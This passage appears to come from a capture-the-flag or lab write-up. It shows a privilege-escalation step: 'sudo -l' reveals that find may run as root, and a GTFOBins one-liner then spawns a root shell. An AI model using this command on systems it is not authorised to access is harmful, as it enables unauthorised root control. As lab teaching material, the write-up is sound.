Running **sudo -l** to check for sudo rules, we discover that we can run **/usr/bin/find** as **root**:

![[Pasted image 20210817025058.png]]

We can take advantage of this by using the command from **GTFObins**:

```bash
sudo find . -exec /bin/sh \; -quit
```

Running this command should give us a **root** shell:

![[Pasted image 20210817025330.png]]